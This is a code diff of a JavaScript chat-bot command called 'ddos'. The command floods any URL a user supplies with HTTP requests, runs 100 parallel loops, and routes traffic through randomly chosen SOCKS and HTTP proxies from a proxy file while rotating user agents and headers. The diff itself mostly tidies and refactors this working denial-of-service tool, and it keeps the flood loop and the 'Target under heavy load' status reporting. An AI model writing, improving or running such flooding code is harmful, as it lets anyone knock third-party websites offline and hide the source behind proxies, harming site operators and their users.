@@ -3,9 +3,7 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
-const {
-    rainbow
-} = require("gradient-string");
+const { rainbow } = require("gradient-string");
 
 module.exports["config"] = {
     name: "ddos",
@@ -63,7 +61,7 @@ const acceptHeaders = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
 ];
 
 const proxyFilePath = path.join(__dirname, "proxy.txt");
@@ -74,29 +72,26 @@ const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
-const sanitizeUA = (userAgent) => {
-    return userAgent.replace(/[^\x20-\x7E]/g, "");
-}
+const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
 
 const userAgents = () => {
     try {
-        const data = fs.readFileSync(ualist, "utf-8").replace(/\r/g, "").split("\n");
-        return data.map((line) => line.trim());
+        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
     } catch (error) {
         console.error(`Failed to read user agent list: ${error}`);
         return [];
     }
-}
+};
 
 const loadProxies = () => {
     try {
-        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim());
+        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
     } catch {
         return [];
     }
 };
 
-const performAttack = (url, agent, headers, continueAttack, onComplete) => {
+const performAttack = (url, agent, headers, continueAttack) => {
     if (!continueAttack) return;
 
     const headersForRequest = {
@@ -108,15 +103,15 @@ const performAttack = (url, agent, headers, continueAttack, onComplete) => {
         "Connection": "keep-alive",
         "DNT": "1",
         "Upgrade-Insecure-Requests": "1",
-        "TE": "Trailers",
+        "TE": "Trailers"
     };
 
     axios.get(url, {
-        httpAgent: agent || null,
-        headers: headersForRequest,
+        httpAgent: agent,
+        headers: headers || headersForRequest,
         timeout: 0
     })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
+    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503)."));
@@ -124,20 +119,18 @@ const performAttack = (url, agent, headers, continueAttack, onComplete) => {
             console.log(rainbow("Bad Gateway (502)."));
         } else if (err.response?.status) {
             console.log(rainbow(`OTHER STATUS: (${err.response?.status})`));
+        } else {
+            console.log(rainbow("Request failed with no response or unknown error."));
         }
-        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
+        setTimeout(() => performAttack(url, agent, headers, continueAttack), 0);
     });
 };
 
-module.exports["run"] = async ({
-    args,
-    chat,
-    font
-}) => {
+module.exports["run"] = async ({ args, chat, font }) => {
     const targetUrl = args[0];
 
     if (!targetUrl || !/^https?:\/\//.test(targetUrl)) {
-        return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
+        return chat.reply(font.thin("Invalid URL. Please provide a valid URL starting with http:// or https://"));
     }
 
     const proxies = loadProxies();
@@ -153,20 +146,15 @@ module.exports["run"] = async ({
         chat.reply(font.thin("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
 
-    for (let i = 0; i < numThreads && continueAttack; i++) {
+    for (let i = 0; i < numThreads; i++) {
+        if (!continueAttack) break;
+
         const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
-        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
-        const proxyUrl = ${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]};
-
-        const agent = proxyProtocol === "socks5"
-        ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
-
-        performAttack(targetUrl, agent, null, continueAttack, () => {
-            if (!continueAttack) {
-                clearTimeout(attackTimeout);
-            }
-        });
+        performAttack(targetUrl, agent, null, continueAttack);
     }
 };
